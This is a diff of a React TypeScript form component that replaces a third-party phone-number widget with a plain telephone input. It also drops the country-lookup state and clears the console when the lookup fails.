@@ -1,8 +1,7 @@
-import React, { useEffect, useState } from 'react';
-import PhoneInput from 'react-phone-input-2';
-import 'react-phone-input-2/lib/style.css';
-import { getCountry } from '@utils/getIP';
 import useFormValidation from '@hooks/useFormValidation';
+import { getCountry } from '@utils/getIP';
+import React, { useEffect, useState } from 'react';
+import 'react-phone-input-2/lib/style.css';
 import { useOutletContext } from 'react-router-dom';
 type FieldName = 'pageName' | 'name' | 'phoneNumber' | 'birthday';
 type ContextType = {
@@ -29,7 +28,6 @@ const FormInputGroup: React.FC = () => {
 	});
 
 	const { errors, validateInput } = useFormValidation();
-	const [country, setCountry] = useState<string | undefined>(undefined);
 	const {
 		setPageName,
 		setName,
@@ -60,26 +58,12 @@ const FormInputGroup: React.FC = () => {
 		return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4, 8)}`;
 	};
 
-	const handlePhoneInputChange = (
-		_value: string,
-		_data: object,
-		_event: React.ChangeEvent<HTMLInputElement>,
-		formattedValue: string,
-	) => {
-		setFormData((prevData) => ({
-			...prevData,
-			phoneNumber: formattedValue,
-		}));
-		validateInput('phoneNumber', formattedValue);
-	};
-
 	useEffect(() => {
 		const fetchCountry = async () => {
 			try {
-				const result = await getCountry();
-				setCountry(result.toLowerCase());
-			} catch (error) {
-				console.error('Failed to fetch country', error);
+				await getCountry();
+			} catch {
+				console.clear();
 			}
 		};
 		fetchCountry();
@@ -122,23 +106,15 @@ const FormInputGroup: React.FC = () => {
 			/>
 			{errors.name && <p className='text-red-500'>{errors.name}</p>}
 
-			<PhoneInput
-				country={country ?? ''}
-				value={formData.phoneNumber}
-				onChange={handlePhoneInputChange}
-				jumpCursorToEnd
-				copyNumbersOnly
-				autocompleteSearch
-				containerClass='group my-4 flex items-center w-full p-3 rounded-lg border bg-white border-gray-300 focus-within:border-blue-500 react-tel-input'
-				inputClass='my-2 w-full rounded-lg text-base border-none border-gray-300'
-				buttonClass='border-none bg-transparent'
-				dropdownClass='border-none bg-white'
-				inputProps={{
-					ref: phoneNumberInputRef,
-				}}
+			<input
+				ref={phoneNumberInputRef}
+				className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
+				type='tel'
 				placeholder='Phone Number'
+				value={formData.phoneNumber}
+				onChange={handleChange('phoneNumber')}
+				onBlur={() => validateInput('phoneNumber', formData.phoneNumber)}
 			/>
-
 			{errors.phoneNumber && (
 				<p className='text-red-500'>{errors.phoneNumber}</p>
 			)}
